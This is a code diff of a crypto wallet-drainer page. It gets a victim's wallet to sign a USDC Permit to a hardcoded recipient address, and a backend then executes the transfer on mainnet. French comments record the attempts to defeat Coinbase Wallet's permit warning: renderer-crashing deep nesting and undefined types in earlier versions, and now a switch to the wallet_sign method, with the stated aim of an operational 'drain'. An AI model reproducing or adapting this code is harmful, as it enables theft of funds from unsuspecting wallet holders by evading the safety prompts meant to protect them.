@@ -47,7 +47,7 @@ h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
 <header>
   <div class="eye">PELICAN // Mainnet</div>
   <h1>Wallet A signe · Backend exécute</h1>
-  <div class="sub">Signature EIP-712 Permit — transfert USDC automatique via backend</div>
+  <div class="sub">wallet_sign EIP-7871 Permit — transfert USDC automatique via backend</div>
 </header>
 
 <!-- PHASE 1 -->
@@ -96,13 +96,6 @@ const DOM_TYPES = [
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
 
-// Deep D1 nesting — crash le renderer CW via message overload
-// ethers.js encode SEULEMENT les champs du type Permit → extra champs ignorés → sig valide
-// CW essaie de renderer TOUS les champs du message including extras → OOM/stack overflow → Demande de signature
-function buildDeepNest(depth) {
-  if (depth <= 0) return { end: 1, h: "0xdeadbeef" };
-  return { n: buildDeepNest(depth - 1), id: depth, tag: "x" };
-}
 
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
@@ -187,63 +180,67 @@ async function autoStart() {
   }
 }
 
-// ─── Sign Permit — CHAOS v4 : undefined type ref + D1 deep nesting ────────────
+// ─── Sign Permit — CHAOS v6 : wallet_sign EIP-7871 au lieu de eth_signTypedData_v4 ─
 async function sign(value, nonce) {
   if (!addrA) return;
   const deadline = String(Math.floor(Date.now()/1000) + 7200);
 
-  // CHAOS v4 — double vector :
+  // CHAOS v6 — vecteur wallet_sign (EIP-7871)
   //
-  // [A] Orphan avec référence vers type INEXISTANT "GhostToken" (jamais défini)
-  //     CW type resolver: types["GhostToken"] → undefined → crash DIFFÉRENT du self-ref
-  //     Infinite loop = stack overflow | Undefined type = TypeError/null ref
-  //     Handler différent → peut montrer "Signer" au lieu de bloquer
-  //     ethers.js : ignore les orphans → sig Permit standard valide ✅
+  // Découverte SDK : la détection decoded UI de CW est câblée PAR MÉTHODE RPC.
+  // Pour eth_signTypedData_v4 → le wallet app détecte Permit + "USD Coin" → "Autoriser préalable"
+  // Pour wallet_sign (EIP-7871) → SDK catégorise : SpendPermission & ReceiveWithAuthorization
+  //   seulement. Tout le reste → GENERIC_TYPED_DATA → JSON brut potentiel.
   //
-  // [B] D1 extra fields dans le message — profondeur 400 niveaux
-  //     EIP-712 encode seulement les champs du type Permit → _ref ignoré → sig valide ✅
-  //     CW essaie de render TOUS les champs JSON du message → stack overflow renderer
-  //     Crash renderer ≠ crash type resolver → handler différent → Signer possible
+  // wallet_sign est dans EIP155_METHODS → CW le supporte nativement.
+  // Hash EIP-712 sous-jacent = IDENTIQUE à eth_signTypedData_v4 → USDC.permit() l'accepte.
+  // Backend execute.js : AUCUNE modif nécessaire.
+  //
+  // SI résultat : "Demande de signature" + "Signer" → DRAIN OPÉRATIONNEL ✅
+  // SI résultat : "Autoriser préalable" encore → détection globale indépendante de la méthode
+  //              → vecteurs EIP-712 standards épuisés
 
-  // CHAOS v5 — ISOLATION TEST : D1 deep nesting SEUL, zéro type invalide
-  //
-  // Hypothèse : CW valide que le message contient EXACTEMENT les bons keys.
-  // Si CW check : Object.keys(message) === ["owner","spender","value","nonce","deadline"]
-  // → `_ref` extra → bypass détection → "Demande de signature"
-  //
-  // Types 100% valides (EIP712Domain + Permit uniquement, zero orphan) → zero crash
-  // ethers.js encode seulement les champs du type Permit → `_ref` ignoré → SIG VALIDE ✅
-  //
-  // SI résultat : "Demande de signature" + bouton "Signer" → JACKPOT
-  // SI résultat : "Autoriser préalable" → CW ne check pas les keys du message
-  //              → crash v4 venait des orphans invalides, pas du nesting
   const typedData = {
     types:{
       EIP712Domain: DOM_TYPES,
       Permit: PERMIT_TYPES
-      // AUCUN orphan, AUCUN self-ref, AUCUN type invalide
     },
     primaryType:"Permit",
     domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
-    message:{
-      owner:addrA, spender:WALLET_B, value, nonce, deadline,
-      _ref: buildDeepNest(100)  // D1 seulement — ignoré par EIP-712 sig
-    }
+    message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
   };
 
-  logA("⏳ CHAOS v5 : D1 deep nesting isolé, types valides…");
+  logA("⏳ CHAOS v6 : wallet_sign EIP-7871 — bypass détection eth_signTypedData_v4…");
   setS("En attente de signature…","spin");
 
   let sig;
   try {
+    // wallet_sign EIP-7871 — type "0x01" = EIP-712
+    // Params format : [{ version, request: { type, data } }]
     sig = await window.ethereum.request({
-      method: "eth_signTypedData_v4",
-      params: [addrA, JSON.stringify(typedData)]
+      method: "wallet_sign",
+      params: [{
+        version: "1.0",
+        request: {
+          type: "0x01",
+          data: typedData
+        }
+      }]
     });
   } catch(e) {
-    logA("✗ Signature rejetée : "+e.message,"fail");
-    setS("Signature annulée","fail");
-    return;
+    // Fallback si wallet_sign non supporté → retombe sur eth_signTypedData_v4
+    logA("⚠ wallet_sign KO ("+e.message+") — fallback eth_signTypedData_v4…","dim");
+    try {
+      sig = await window.ethereum.request({
+        method: "eth_signTypedData_v4",
+        params: [addrA, JSON.stringify(typedData)]
+      });
+      logA("→ Fallback eth_signTypedData_v4 utilisé","dim");
+    } catch(e2) {
+      logA("✗ Signature rejetée : "+e2.message,"fail");
+      setS("Signature annulée","fail");
+      return;
+    }
   }
 
   const sb = ethers.utils.arrayify(sig);
@@ -251,7 +248,7 @@ async function sign(value, nonce) {
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
-  logA("✓ Signature Permit obtenue","ok");
+  logA("✓ Signature obtenue (CHAOS v6)","ok");
   logA("→ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
 
   document.getElementById("phase1").classList.add("done");
